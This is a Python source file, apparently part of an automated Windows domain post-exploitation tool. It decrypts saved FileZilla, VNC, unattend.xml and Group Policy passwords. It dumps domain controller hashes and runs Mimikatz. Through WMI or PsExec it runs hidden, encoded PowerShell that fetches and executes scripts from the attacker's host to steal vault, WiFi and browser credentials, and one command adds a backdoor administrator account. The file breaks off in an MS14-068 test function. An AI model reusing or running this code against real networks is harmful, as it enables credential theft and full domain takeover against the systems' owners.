def downloadFile(targetIP,domain,username,password,filePath):  
    lootPath=origScriptPath+"/loot"
    tmpFilePath=filePath.split(":\\")
    shareName=tmpFilePath[0]+"$"    
    filePath=tmpFilePath[1]
    filePath=filePath.replace("\\","/")  
    if not filePath.startswith("/"):
        filePath="/"+filePath  
    try:
        conn = SMBConnection1(username,password,client_machine_name,targetIP,domain=domain,use_ntlm_v2=True,is_direct_tcp=True)
        connected = conn.connect(targetIP, 445)
        if connected == True:
            try:
                if not os.path.exists(lootPath):
                    os.mkdir(lootPath)
                file_obj = tempfile.NamedTemporaryFile(delete=False)
                tempFilename = tempfile.NamedTemporaryFile(dir='.').name
                tempFilename=targetIP+"_"+tmpFilePath[0]+"_"+filePath.replace("/","_")
                file_obj = open(lootPath+"/"+tempFilename, 'w')
                (file_attributes, filesize) = conn.retrieveFile(shareName,filePath, file_obj)
                file_obj.close()
                return lootPath+"/"+tempFilename
            except Exception as e:
                #print e
                return ""
    except Exception as e:
        return ""

def parseSiteManagerXML(filename):
    #Sample https://raw.githubusercontent.com/synzox/dotfiles/master/.filezilla/sitemanager.xml
    resultList = []
    with open(filename, 'r') as myfile:
        data = myfile.read().replace('\n', '')
        result = xmltodict.parse(data)
        if isinstance(result['FileZilla3']['Servers'],dict)==True:
            tmphostNo=""
            tmpportNo=""
            tmpusername=""
            tmppassword=""
            for k1, v1 in result['FileZilla3']['Servers'].iteritems():
                if k1=='Server':
                    if isinstance(v1,list):
                        for x in v1:
                            if isinstance(x,dict):
                                tmphostNo=x['Host']
                                tmpportNo=x['Port']
                                try:
                                    tmpusername=x['User']
                                except KeyError:
                                    tmpusername=""
                                try:
                                    tmppassword=x['Pass']
                                except KeyError:
                                    tmppassword=""
                                try:
                                    tmpdecodedPassword=base64.b64decode(tmppassword)
                                except TypeError:
                                    tmpdecodedPassword=tmppassword
                                if len(tmpusername)>0 and len(tmpdecodedPassword)>0:
                                    resultList.append([tmphostNo+":"+tmpportNo, tmpusername, tmpdecodedPassword])
    return resultList

def decryptUltraVNC(hashPassword):
    try:
        hashPassword = binascii.unhexlify(hashPassword)
        desKey = "\xE8\x4A\xD6\x60\xC4\x72\x1A\xE0"
        obj = Crypto.Cipher.DES.new(desKey, Crypto.Cipher.DES.MODE_ECB)
        decrypt = obj.decrypt(hashPassword)
        decrypt=decrypt.replace("\x00","")
        return decrypt
    except Exception, e:
        print e

def parseUltraVNC(filename):
    #Sample https://raw.githubusercontent.com/justdan96/VNCappWrapper/master/ultravnc.ini
    #Decrypt tool http://tools88.com/safe/vnc.php
    resultList = []
    passwd1 = ''
    passwd2 = ''
    with open(filename, 'r') as myfile:
        data = myfile.read().splitlines()
        for row in data:
            tmpRow = row.strip()
            if 'passwd' in row.strip().lower():
                passwd1 = tmpRow.split('=')[1].strip()
            if 'passwd2' in row.strip().lower():
                passwd2 = tmpRow.split('=')[1].strip()
        if len(passwd1) > 0 or len(passwd2) > 0:
            passwd1 = decryptUltraVNC(passwd1[0:16])
            passwd2 = decryptUltraVNC(passwd2[0:16])
            resultList.append([passwd1, passwd2])
    return resultList

def parseUnattendXML(filename):
    #Sample http://www.itninja.com/question/how-do-i-add-a-custom-local-administrator-account-through-sysprep
    tmpUserList=[]
    try:
        with open(filename, 'r') as myfile:
            data = myfile.read().replace('\n', '')
            result = xmltodict.parse(data)
            if isinstance(result['unattend']['settings'],list)==True:
                for y in result['unattend']['settings']:
                    if isinstance(y,dict)==True:
                        for k1, v1 in y.iteritems():
                            if k1=='component':
                                if isinstance(v1,list)==True:
                                    for z in v1:
                                        for key, value in z.iteritems():
                                           if key=='UserAccounts':
                                                for k, v in value.iteritems():
                                                    if k=='AdministratorPassword':
                                                        tmpUsername='Administrator'
                                                        tmpPassword=v['Value']
                                                        if [tmpUsername,tmpPassword] not in tmpUserList:
                                                            tmpUserList.append([tmpUsername,tmpPassword])
                                                    if k=='LocalAccounts':
                                                        tmpUsername=v['LocalAccount']['DisplayName']
                                                        tmpPassword=v['LocalAccount']['Password']['Value']
                                                        if [tmpUsername,tmpPassword] not in tmpUserList:
                                                            tmpUserList.append([tmpUsername,tmpPassword])
            else:
                for key, value in result['unattend']['settings'].iteritems():
                    if key=='component':
                        if isinstance(value,list)==True:
                            for x in value:
                                for k1, v1 in x.iteritems():
                                    if k1=='WindowsDeploymentServices':
                                        for k2, v2 in v1.iteritems():
                                            if k2=='Login':
                                                tmpUsername=v2['Credentials']['Username']
                                                tmpPassword=v2['Credentials']['Password']
                                                if [tmpUsername,tmpPassword] not in tmpUserList:
                                                    tmpUserList.append([tmpUsername,tmpPassword]) 

    except:
        print "Error parsing unattend.xml file"
    return tmpUserList

def decryptGPP(cpassword):
    #https://raw.githubusercontent.com/reider-roque/pentest-tools/master/password-cracking/gpprefdecrypt/gpprefdecrypt.py
    # Key from MSDN: http://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be%28v=PROT.13%29#endNote2
    key = ("4e9906e8fcb66cc9faf49310620ffee8" 
          "f496e806cc057990209b09a433b66c1b").decode('hex')
    cpassword += "=" * ((4 - len(cpassword) % 4) % 4)
    password = base64.b64decode(cpassword)     
    # Decrypt the password
    iv = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    o = AES.new(key, AES.MODE_CBC, iv).decrypt(password)     
    return o[:-ord(o[-1])].decode('utf16')
 
def getOSType():
    import platform
    return platform.system()

def mountSysvol(username,password):
    #Sample cpassword=j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
    tmpPassList=[]
    randomFoldername=generateRandomStr()
    cmd = "mkdir /tmp/"+randomFoldername
    resultList = runCommand(cmd, shell = True, timeout = 15) 
    cmd = "umount /tmp/"+randomFoldername
    resultList = runCommand(cmd, shell = True, timeout = 15) 
    if getOSType()=="Darwin":
        cmd = "mount_smbfs  //"+username+":'"+password+"'@"+dcList[0]+"/sysvol /tmp/"+randomFoldername
    if getOSType()=="Linux":
        cmd = "mount -t cifs //"+dcList[0]+"/sysvol /tmp/"+randomFoldername+" -o username="+username+",password="+password
    resultList = runCommand(cmd, shell = True, timeout = 15) 
    cmd = "grep -lir cpassword /tmp/"+randomFoldername
    resultList = runCommand(cmd, shell = True, timeout = 60) 
    if len(resultList[1])>0:
        fileList=resultList[1].split("\n")
        tmpPassList=[]
        if len(fileList)>0:
            print (setColor("[+]", bold, color="green"))+" Credentials found in SYSVOL folder"
            for x in fileList:
                x=x.strip()
                if len(x)>0:
                    if len(x.strip())>0:
                        with open(x, 'r') as myfile:
                            username=""
                            password=""
                            content=myfile.read().replace('\n', '')
                            m = re.search('userName="(\S*)"', content)
                            if m:
                                username = m.group(1)
                            m = re.search('cpassword="(\S*)"', content)
                            if m:
                                password = m.group(1)
                                print "[*] Base64 Password Found: "+password
                                password=decryptGPP(password)
                            if len(username)>0 and len(password)>0:
                                username = username.lower()
                                if [username,password] not in tmpPassList:
                                    tmpPassList.append([username,password])
        if len(tmpPassList)>0:
            print (setColor("[+]", bold, color="green"))+" Decrypted GPP Password"            
            headers = ["Username","Password"]
            print tabulate(tmpPassList,headers,tablefmt="simple")
            if len(tmpPassList)>0:
                print "\nTesting Credentials"
            for x in tmpPassList:
                tmpusername=x[0]
                x[1]
                for dc in dcList:
                    passwordHash=None
                    tmpLoginOK,tmpAdminOK=testDomainCredentials(username,password,passwordHash,dc,domain)
                    if tmpAdminOK==True:
                        if tmpusername in domainAdminList:
                            print "User: '"+tmpusername+"' is a 'Domain Admin'"
                            if dcCompromised==False:
                                print (setColor("\nDumping Hashes from Domain Controller: "+ip, bold, color="green"))
                                tmpHashList=dumpDCHashes(ip,domain,username,password,passwordHash)    
                                if len(tmpHashList)>0:
                                    addHashes(ip,tmpHashList)
                                    if ip in uncompromisedHostList:
                                        uncompromisedHostList.remove(ip)
                                    analyzeHashes(tmpHashList)
                                print (setColor("\nDumping Plaintext Credentials from Domain Controller: "+ip, bold, color="green"))
                                tmpPasswordList=runMimikatz(ip,domain,username,password,passwordHash)    
                                for y in tmpPasswordList:
                                    if y not in userPassList:
                                        userPassList.append(y)
                                dcCompromised=True

                        else:
                            print "User: '"+tmpusername+"' is not a 'Domain Admin'"
        else:
            print "No credentials found"
    cmd = "umount /tmp/"+randomFoldername
    resultList = runCommand(cmd, shell = True, timeout = 15) 
    return tmpPassList

def findInterestingFiles(targetIP,domain,username,password,passwordHash):
    findFileList=[]
    findFileList.append('httpd.conf')
    findFileList.append('ultravnc.ini')
    findFileList.append('unattend.xml')
    findFileList.append('sysprep.xml')
    findFileList.append('sitemanager.xml')
    findFileList.append('recentservers.xml')
    findFileList.append('web.config')
    findFileList.append('*.kdbx')
    findFileList.append('*.kdb')
    findFileList.append('*password*.txt')    
    findFileList.append('*password*.xls')    
    findFileList.append('*password*.xlsx')    
    findFileList.append('*password*.doc')    
    findFileList.append('*password*.docx')    
    findFileList.append('*password*.pdf')    
    searchKeywords="$searchKeywords=@("
    for x in findFileList:
        searchKeywords+="'"+x+"',"
    searchKeywords=searchKeywords[0:-1]+")"
    tmpDriveList=[]
    print "[*] Enumerating Drives on Host: "+targetIP
    command=powershellCmdStart+' -command "get-psdrive -psprovider filesystem | Select Name"'
    if debugMode==True:
        print command
    results=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)    
    tmpResultList=results.split("\n")
    count=0
    for x in tmpResultList:
        x=x.strip()
        if len(x)>0:
            if count>1:
                tmpDriveList.append(x)
            count+=1
    tmpFileList=[]
    if len(tmpDriveList)>0:
        print "[*] Drives found on Host: "+targetIP
        tmpDriveList1=[]
        for x in tmpDriveList:
            tmpDriveList1.append(x+"$")
        print ", ".join(tmpDriveList1)
    print "[*] Finding Files on Host: "+targetIP
    for drive in tmpDriveList:
        command=powershellCmdStart+' -command '+searchKeywords+'; Get-ChildItem -Path "'+drive+':\" -Recurse -Include "$searchKeywords" -Name'
        if debugMode==True:
            print command
        results=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)    
        if "Cannot find path" not in str(results):
            tmpResultList=results.split("\n")
            for x in tmpResultList:
                if len(x)>0:
                    filename=drive+":\\"+x
                    if drive+":\\Windows" not in filename and filename.count("\\")>1:
                        if filename not in tmpFileList:
                            tmpFileList.append(filename)
    print (setColor("[+]", bold, color="green"))+" List of Interesting Files Found"
    for filename in tmpFileList:
        print filename
    print "\n"
    #results=runPSEXEC(targetIP, domain, username, password, passwordHash, command)    
    return tmpFileList

def findInterestingRegKeys(targetIP,domain,username,password,passwordHash):
    interestingRegList = []
    interestingRegList.append(['HKLM\\SOFTWARE\\RealVNC\\WinVNC4','Password'])
    interestingRegList.append(['HKCU\\Software\\ORL\\WinVNC3', 'Password'])
    interestingRegList.append(['HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon', 'DefaultUsername'])
    interestingRegList.append(['HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon', 'DefaultPassword'])
    interestingRegList.append(['HKLM\SYSTEM\ControlSet\services\SNMP\Parameters\ValidCommunities', ''])
    interestingRegList.append(['HKU\\Software\\SimonTatham\\Putty\\Sessions', ''])
    for x in interestingRegList:
        keyPath = x[0]
        selectedKey = x[1]
        results = readRemoteRegistry(targetIP,domain,username,password,passwordHash,keyPath,selectedKey)
        if results != None:
            if 'Putty' in x[0]:
                for y in results:
                    keyPath1 = keyPath + '\\' + y
                    selectedKey = 'ProxyPassword'
                    results = readRemoteRegistry(targetIP,domain,username,password,passwordHash,keyPath1,selectedKey)
                    if results != None:
                        if passwordHash != None:
                            tmpRegResultList1.append([targetIP,keyPath1 + '\\' + selectedKey,results])
                        else:
                            tmpRegResultList1.append([targetIP,keyPath1 + '\\' + selectedKey,results,])
            else:
                if passwordHash != None:
                    tmpRegResultList1.append([targetIP,keyPath + '\\' + selectedKey,results])
                else:
                    tmpRegResultList1.append([targetIP,keyPath + '\\' + selectedKey,results])
    return tmpRegResultList1

def runDumpMSSQL(targetIP,domain,username,password,passwordHash): 
    #https://github.com/NetSPI/PowerUpSQL   
    print setColor('\nDumping MSSQL Service Credentials', bold, color='red')
    command="-Command (New-Object Net.WebClient).DownloadFile(\'http://"+myIP+":8000/PowerUpSQL.psd1\','C:\windows\\temp\PowerUpSQL.psd1'); (New-Object Net.WebClient).DownloadFile(\'http://"+myIP+":8000/PowerUpSQL.ps1\','C:\windows\\temp\PowerUpSQL.ps1'); (New-Object Net.WebClient).DownloadFile(\'http://"+myIP+":8000/PowerUpSQL.psm1\','C:\windows\\temp\PowerUpSQL.psm1'); (New-Object Net.WebClient).DownloadFile(\'http://"+myIP+":8000/Inveigh.ps1\','c:\windows\\temp\Inveigh.ps1'); (New-Object Net.WebClient).DownloadFile(\'http://"+myIP+":8000/Inveigh.ps1\Get-SQLServiceAccountPwHash3.ps1\','c:\windows\\temp\Get-SQLServiceAccountPwHash3.ps1'); Import-Module C:\windows\\temp\PowerUpSQL.psm1; Import-Module C:\windows\\temp\Inveigh.ps1; Import-Module C:\windows\\temp\Get-SQLServiceAccountPwHashes.ps1; Get-SQLServiceAccountPwHashes -Verbose -TimeOut 5 -CaptureIp "+targetIP
    #print powershellCmdStart+command
    results=runWMIEXEC(targetIP, domain, username, password, passwordHash, powershellCmdStart+command)  
    tmpResultList=results.split("\n")
    found1=False
    found2=False
    tmpHashList=[]
    for x in tmpResultList:
        if found2==True:
            x=x.strip()
            if x not in tmpHashList:
                tmpHashList.append(x) 
        if 'Final List of Captured password hashes:' in x:
            found1=True
        if found1==True:
            if '---------------------------------------' in x:
                found2=True
    if len(tmpHashList)<1:
        print "No credentials captured"
    return tmpHashList        

def runDumpVault(targetIP,domain,username,password,passwordHash):    
    tmpResultList=[]
    osArch64=getPowershellVersion(targetIP,domain,username,password,passwordHash)
    powershellPath=getPowershellPath(osArch64)
    powershellArgs=' -windowstyle hidden -NoProfile -NoLogo -NonInteractive -Sta -ep bypass '
    command=powershellPath+" "+powershellArgs+" \"IEX (New-Object Net.WebClient).DownloadString(\'http://"+myIP+":8000/Get-VaultCredential.ps1\'); Get-VaultCredential\""
    if debugMode==True:
        print command
    results=runPSEXEC(targetIP, domain, username, password, passwordHash, powershellCmdStart+command)   
    tmpResultList=results.split("\n")
    return tmpResultList    

def dumpWifi(targetIP,domain,username,password,passwordHash):
    #netsh wlan add profile filename="wlan.xml" interface="Wireless Network Connection" user=current
    #https://gist.github.com/milo2012/7ba74a4451f19a96078597d1f5b85dad/raw/85d9f2364116f99db78bf6993df2d42e106b5baf/wirelessProfile.xml
    '''
    <?xml version="1.0" encoding="US-ASCII"?>
    <WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
        <name>SampleWPAPSK</name>
        <SSIDConfig>
            <SSID>
                <name>SampleWPAPSK</name>
            </SSID>
        </SSIDConfig>
        <connectionType>ESS</connectionType>
        <connectionMode>auto</connectionMode>
        <autoSwitch>false</autoSwitch>
        <MSM>
            <security>
                <authEncryption>
                    <authentication>WPAPSK</authentication>
                    <encryption>TKIP</encryption>
                    <useOneX>false</useOneX>
                </authEncryption>
            </security>
        </MSM>
    <sharedKey>
        <keyType>passPhrase</keyType>
        <protected>false</protected>
        <keyMaterial> <!-- insert key here --> </keyMaterial>
    </sharedKey>    
    </WLANProfile>
    '''    
    domain=domain.strip()
    results=[]
    tempFilename = tempfile.NamedTemporaryFile(dir='.').name
    tempFilename += '.ps1'
    tempFilename = tempFilename.replace(os.getcwd() + '/', '')
    osArch64=getPowershellVersion(ip,domain,username,password,passwordHash)
    powershellPath=getPowershellPath(osArch64)
    powershellArgs=' -windowstyle hidden -NoProfile -NoLogo -NonInteractive -Sta -ep bypass '
    command=powershellPath+" "+powershellArgs+" IEX \"(New-Object Net.WebClient).DownloadString(\'http://"+myIP+":8000/WiFi-Password.psm1\'); Show-WiFiPassword\""
    if debugMode==True:
        print command
    if len(domain)<1:
        domain="WORKGROUP"
    results=runPSEXEC(targetIP, domain, username, password, passwordHash, command)
    resultList=results.split("\n")
    tmpResultList=[]   
    tmpSSID=''
    tmpPassword=''
    tmpAuthType='' 
    for x in resultList:
        if "SSID       :" in x:
            x=(x.replace("SSID       :","")).strip()
            if len(x)>0:
                tmpSSID=x
        if "Password   :" in x:
            x=(x.replace("Password   :","")).strip()
            if len(x)>0:
                tmpPassword=x
        if "Auth type  :" in x:
            x=(x.replace("Auth type  :","")).strip()
            if len(x)>0:
                tmpAuthType=x
        if len(tmpSSID)>0:
            tmpResultList.append([tmpSSID,tmpPassword,tmpAuthType])
    return tmpResultList

def dumpBrowser(targetIP,domain,username,password,passwordHash):
    tmpPasswordList=[]
    print "[*] Checking Installed Browsers on Host: "+targetIP
    appList=getInstalledPrograms(targetIP,domain,username,password,passwordHash)
    for appName in appList:
        if "Google Chrome" in str(appName):
            print "Google Chrome"
        if "Mozilla" in str(appName):
            print "Mozilla Firefox"
            print "\n"    
    tmpFound=False
    tmpBrowserList=[]
    for appName in appList:
        if "Google Chrome" in str(appName) or "Mozilla" in str(appName):    
            if "Google Chrome" in str(appName):
                tmpBrowserList.append("chrome")
            if "Mozilla" in str(appName):
                tmpBrowserList.append("firefox")
            tmpFound=True
    if tmpFound==False:
        print "Google Chrome and Mozilla Firefox Browsers Not Found on Host: "+targetIP
    if tmpFound==True:        
        print "[*] Checking Currently Logged On Users on Host: "+targetIP
        osArch64=getPowershellVersion(targetIP,domain,username,password,passwordHash)
        powershellPath=getPowershellPath(osArch64)
        powershellArgs=' -windowstyle hidden -NoProfile -NoLogo -NonInteractive -Sta -ep bypass '
        command=' -Command "Get-WMIObject -class Win32_ComputerSystem | select username"'
        command=powershellPath+" "+powershellArgs+command
        if debugMode==True:
            print command
        if len(password)>0:
            passwordHash=None
        results=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)    
        tmpResultList=results.split("\n")
        foundStart=False
        loggedInUsersList=[]
        for x in tmpResultList:
            x=x.strip()            
            if len(x)>0:
                if foundStart==True:
                    if x not in loggedInUsersList:
                        loggedInUsersList.append(x)                            
                if '--------' in x:
                    foundStart=True
        if len(loggedInUsersList)>0:
            print "[*] Currently Logged In Users"
            for x in loggedInUsersList:
                print x

        tmpFoundAccounts=[]
        for x in loggedInUsersList:
            if "\\" in x:
                tmpdomain=(x.split("\\")[0]).lower()
                tmpusername=(x.split("\\")[1]).lower()
                tmpFoundAccounts.append([tmpdomain,tmpusername])
                #for y in userPassList:
                #    tmpdomain1=(y[1]).lower()
                #    tmpusername1=(y[2]).lower()
                #    if tmpdomain in tmpdomain1 and tmpusername==tmpusername1:
                #        tmpFoundAccounts.append(y)
            else:
                tmpusername=x
                tmpFoundAccounts.append(["workgroup",tmpusername])
                #for y in userPassList:
                #    tmpdomain1=(y[1]).lower()
                #    tmpusername1=(y[2]).lower()
                #    if x==tmpusername1:
                #        tmpFoundAccounts.append(y)
        if len(tmpFoundAccounts)>0:
            for x in tmpFoundAccounts:
                tmpdomain=x[0]
                tmpusername=x[1]

                #print "[*] Found the Below Credentials in Database"
                #print tabulate(tmpFoundAccounts)
                if "firefox" in tmpBrowserList:
                    print "\n[*] Dumping Firefox Passwords from Host: "+targetIP                        
                    print "[*] Uploading Script to Host: "+targetIP
                    outputFilename=generateRandomStr()+".txt"
                    batFilename=generateRandomStr()+".bat"
                    tmpSchedName=generateRandomStr()
                    #s='IEX (New-Object Net.WebClient).DownloadString(\'http://'+myIP+':8000/BrowserGather.ps1\'); Get-ChromeCreds | Out-File C:\\windows\\temp\\'+outputFilename
                    s='IEX (New-Object Net.WebClient).DownloadString(\'http://'+myIP+':8000/Get-FoxDump.ps1\'); Get-FoxDump -OutFile C:\\windows\\temp\\'+outputFilename
                    encodedPS=powershell_encode(s)
                    cmd = "C:\windows\sysWOW64\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden -NoProfile -NoLogo -NonInteractive -Sta -ep bypass -ec "+encodedPS
                    target = open(batFilename, 'w')
                    target.write(cmd)
                    target.close()
                    uploadFile(batFilename,batFilename,targetIP, domain, username, password, passwordHash)
                
                    #print "[*] Scheduling Tasks on Host: "+targetIP
                    command='schtasks.exe /Delete /TN '+tmpSchedName+' /f'
                    results=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)    
                    command='schtasks.exe /Create /RL HIGHEST /RU '+tmpdomain+'\\'+tmpusername+' /TN '+tmpSchedName+' /SC MONTHLY /M DEC /TR "'"C:\\windows\\temp\\"+batFilename+"\""
                    if debugMode==True:
                        print command
                    results=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)   
                    if "ERROR" in str(results):
                        print results
                    else: 
                        #print "[*] Running Tasks on Host: "+targetIP
                        command='schtasks /Run /TN '+tmpSchedName    
                        results=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)    
                        checkComplete=False
                        while checkComplete==False:
                            command='schtasks /Query /TN '+tmpSchedName
                            results=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)            
                            tmpResultList=results.split("\n")
                            for x in tmpResultList:
                                if tmpSchedName in x:
                                    if "Ready" in x or "Running" in x:
                                        if "Ready" in x:
                                            #print "[*] Removing Tasks from Host: "+targetIP
                                            command='schtasks.exe /Delete /TN '+tmpSchedName+' /f'                
                                            runWMIEXEC(targetIP, domain, username, password, passwordHash, command)    
                                            checkComplete=True
                                        if "Running" in x:
                                            time.sleep(10)
                        filename="C:\\windows\\temp\\"+outputFilename
                        tmpFilename=(downloadFile(targetIP,domain,username,password,filename))
                        if os.path.exists(tmpFilename):
                            tmpFilename1=convertWinToLinux(tmpFilename)
                            with open(tmpFilename1) as f:
                                content = f.readlines()     
                                tmpFound=False                    
                                for y in content:
                                    if tmpFound==True:
                                        tmpList1=y.split(" ")
                                        tmpPass=''
                                        tmpUrl=''
                                        tmpCount=0
                                        for z in tmpList1:
                                            if len(z)>0:
                                                if tmpCount==0:
                                                    tmpPass=z
                                                else:
                                                    tmpUrl=z
                                                tmpCount+=1
                                        tmpPasswordList.append([tmpPass,tmpUrl])
                                    if "--------" in y:
                                        tmpFound=True     
                if "chrome" in tmpBrowserList:
                    print "\n[*] Dumping Chrome Passwords from Host: "+targetIP                        
                    print "[*] Uploading Script to Host: "+targetIP
                    outputFilename=generateRandomStr()+".txt"
                    batFilename=generateRandomStr()+".bat"
                    tmpSchedName=generateRandomStr()
                    #s='IEX (New-Object Net.WebClient).DownloadString(\'http://'+myIP+':8000/BrowserGather.ps1\'); Get-ChromeCreds | Out-File C:\\windows\\temp\\'+outputFilename
                    s='IEX (New-Object Net.WebClient).DownloadString(\'http://'+myIP+':8000/BrowserGather.ps1\'); Get-ChromeCreds | Out-File C:\\temp\\'+outputFilename
                    encodedPS=powershell_encode(s)
                    cmd = powershellPath+" -windowstyle hidden -NoProfile -NoLogo -NonInteractive -Sta -ep bypass -ec "+encodedPS
                    target = open(batFilename, 'w')
                    target.write(cmd)
                    target.close()
                    uploadFile(batFilename,batFilename,targetIP, domain, username, password, passwordHash)
                
                    #print "[*] Scheduling Tasks on Host: "+targetIP
                    command='schtasks.exe /Delete /TN '+tmpSchedName+' /f'
                    results=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)    
                    command='schtasks.exe /Create /RL HIGHEST /RU '+tmpdomain+'\\'+tmpusername+' /TN '+tmpSchedName+' /SC MONTHLY /M DEC /TR "'"C:\\windows\\temp\\"+batFilename+"\""
                    if debugMode==True:
                        print command
                    results=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)   
                    if "ERROR" in str(results):
                        print results
                    else: 
                        #print "[*] Running Tasks on Host: "+targetIP
                        command='schtasks /Run /TN '+tmpSchedName    
                        results=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)    
                        checkComplete=False
                        while checkComplete==False:
                            command='schtasks /Query /TN '+tmpSchedName
                            results=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)            
                            tmpResultList=results.split("\n")
                            for x in tmpResultList:
                                if tmpSchedName in x:
                                    if "Ready" in x or "Running" in x:
                                        if "Ready" in x:
                                            #print "[*] Removing Tasks from Host: "+targetIP
                                            command='schtasks.exe /Delete /TN '+tmpSchedName+' /f'                
                                            runWMIEXEC(targetIP, domain, username, password, passwordHash, command)    
                                            checkComplete=True
                                        if "Running" in x:
                                            time.sleep(10)
                        filename="C:\\temp\\"+outputFilename
                        tmpFilename=(downloadFile(targetIP,domain,username,password,filename))
                        with open(tmpFilename) as f:
                            lines = f.read().splitlines()                        
                            for z in lines:
                                print z
                        os.remove(batFilename)
        else:
            print "[*] No matching credentials found in database"
    return tmpPasswordList

def dumpIIS(targetIP,domain,username,password,passwordHash):  
    tmpResultList=[] 
    osArch64=getPowershellVersion(targetIP,domain,username,password,passwordHash)
    powershellPath=getPowershellPath(osArch64)
    powershellArgs=' -windowstyle hidden -NoProfile -NoLogo -NonInteractive -Sta -ep bypass '
    #command=powershellPath+" "+powershellArgs+" \"IEX (New-Object Net.WebClient).DownloadString(\'http://"+myIP+":8000/get-applicationhost.ps1\'); Get-ApplicationHost | Format-Table -Autosize\""
    #command=powershellPath+" "+powershellArgs+" -Command \"(New-Object Net.WebClient).DownloadFile(\'http://'+myIP+':8000/get-applicationhost.ps1\',\'%temp%\get-applicationhost.ps1\'); . %temp%\get-applicationhost.ps1; Get-ApplicationHost | Format-Table -Autosize\""
    #command=powershellPath+" "+powershellArgs+"-Command \"(New-Object Net.WebClient).DownloadFile(\'http://"+myIP+":8000/get-applicationhost.ps1\',\'%temp%\get-applicationhost.ps1\'); . %temp%\get-applicationhost.ps1\""
    command=powershellPath+" "+powershellArgs+" IEX (New-Object Net.WebClient).DownloadFile(\'http://"+myIP+":8000/get-applicationhost.ps1\',\'%temp%\get-applicationhost.ps1\'); . %temp%\get-applicationhost.ps1"
    results=runWMIEXEC(targetIP, domain, username, password, passwordHash, powershellCmdStart+command)    
    if debugMode==True:
        print command
        print results
    username=""
    domain=""
    password=""
    if "Appcmd.exe does not exist in the default location" not in str(results):
        return tmpResultList
    else:
        return []

def localPrivEscalation():
    cmd='powershell "IEX (New-Object Net.WebClient).DownloadString(\'http://is.gd/fVC1Yd\'); Invoke-Tater -Trigger 1 -Command ""net user tater Winter2016 /add && net localgroup administrators tater /add"""'
    print cmd
    return True

def setDateTime(date1):
    cmd = 'date -s "'+date1+'"'
    runCommand1(cmd) 

def compareTime(date1,date2):
    tmp1=date1.split(" ")
    count=0
    for x in tmp1:
        if len(x)>0:
            if count==2:
                day1=x
            if count==1:
                mth1=convertMth(x)
            if (x.count(":"))>1:
                time1=x
            count+=1
    year1=tmp1[-1]
    hour1=time1.split(":")[0]
    min1=time1.split(":")[1]

    tmp2=date2.split(" ")
    count=0
    for x in tmp2:
        if len(x)>0:
            if count==2:
                day2=x
            if count==1:
                mth2=convertMth(x)
            if (x.count(":"))>1:
                time2=x
            count+=1
    year2=tmp2[-1]
    hour2=time2.split(":")[0]
    min2=time2.split(":")[1]

    if year1==year2 and mth1==mth2 and day1==day2 and hour1==hour2:
        if (int(min1)-int(min2)<5):
            return True
        else:
            return False
    else:
        newDateTime=day1+" "+convertMthNum(mth1)+" "+year1+" "+time1
        setDateTime(newDateTime)
        return False


def isOpen(ip,port):
    global liveList
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((ip, int(port)))
        if [ip,port] not in liveList:
            liveList.append([ip,port])
        s.close()
        return True
    except Exception as e:
        return False

def scanThread(ip, port):
    try:
        t = threading.Thread(target=isOpen, args=(ip, port))
        t.start()
    except Exception:
        pass

def syncDateTime(dateTime1):
    print "[*] Syncing Date/Time with Remote DC"
    mth1=dateTime1.split(" ")[1]    
    day1=dateTime1.split(" ")[0]    
    year1=dateTime1.split(" ")[-1]    
    time1=dateTime1.split(" ")[3]  
    hour1=time1.split(":")[0]
    minute1=time1.split(":")[1]
    sec1=time1.split(":")[2]
    
    cmd='timedatectl set-ntp 0'
    resultList = runCommand(cmd, shell = True, timeout = 30)
    cmd='date --set '+year1+'-'+convertMth(mth1)+'-'+day1
    resultList = runCommand(cmd, shell = True, timeout = 30)
    cmd='date --set '+hour1+':'+minute1+':'+sec1
    resultList = runCommand(cmd, shell = True, timeout = 30)

def convertMth(text):
    if text=="Jan":
        return "1"
    if text=="Feb":
        return "2"
    if text=="Mar":
        return "3"
    if text=="Apr":
        return "4"
    if text=="May":
        return "5"
    if text=="Jun":
        return "6"
    if text=="Jul":
        return "7"
    if text=="Aug":
        return "8"
    if text=="Sep":
        return "9"
    if text=="Oct":
        return "10"
    if text=="Nov":
        return "11"
    if text=="Dec":
        return "12"

def convertMthNum(text):
    if text=="1":
        return "Jan"
    if text=="2":
        return "Feb"
    if text=="3":
        return "Mar"
    if text=="4":
        return "Apr"
    if text=="5":
        return "May"
    if text=="6":
        return "Jun"
    if text=="7":
        return "Jul"
    if text=="8":
        return "Aug"
    if text=="9":
        return "Sep"
    if text=="10":
        return "Oct"
    if text=="11":
        return "Nov"
    if text=="12":
        return "Dec"

def setupSMBShare():
    s="""[global]
        workgroup = MYGROUP
        server string = Samba Server %v
        netbios name = debian
        security = user
        map to guest = bad user
        dns proxy = no

        [guest]
        force user = root
        path = %s
        browseable = yes
        writable = yes
        guest ok = yes
        read only = no
    """ 
    s=s.replace("%s",origScriptPath+"/loot")
    filename="/etc/samba/smb.conf"    
    target = open(filename, 'w')
    target.write(s)
    target.close()
    cmd="service smbd restart"
    resultList = runCommand(cmd, shell = True, timeout = 120)

def testMS14_068(ip,domain,username,password,passwordHash):
    #Setup SMB Share

    tmpPassList=[]
    tmpHashList=[]
    domainShort,domainFull=reverseLookup(ip)
    n = NetBIOS(broadcast=True, listen_port=0)
    netbiosName=''
    try:
        netbiosName=n.queryIPForName(ip)[0]
    except Exeception:
        pass
